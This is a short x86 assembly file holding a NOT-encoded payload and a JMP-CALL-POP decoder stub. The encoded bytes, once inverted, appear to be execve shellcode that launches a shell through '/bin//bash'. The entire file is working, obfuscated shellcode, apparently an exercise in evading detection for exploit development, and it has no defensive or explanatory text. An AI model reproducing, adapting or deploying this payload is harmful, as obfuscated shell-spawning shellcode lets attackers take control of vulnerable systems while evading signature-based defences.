global _start

_start:
    xor ecx, ecx
    mov cl, 0x1e
    jmp stage1

stage2:
    pop esi

stage3:
    not BYTE [esi]
    inc esi
    loop stage3

    jmp shell

stage1:
    call stage2
    shell: db 0xce,0x24,0xac,0x97,0x9d,0x9e,0x8c,0x97,0x97,0x9d,0x96,0x91,0xd0,0x97,0xd0,0xd0,0xd0,0xd0,0x76,0x1c,0xce,0x36,0xce,0x2d,0xce,0x3f,0x4f,0xf4,0x32,0x7f
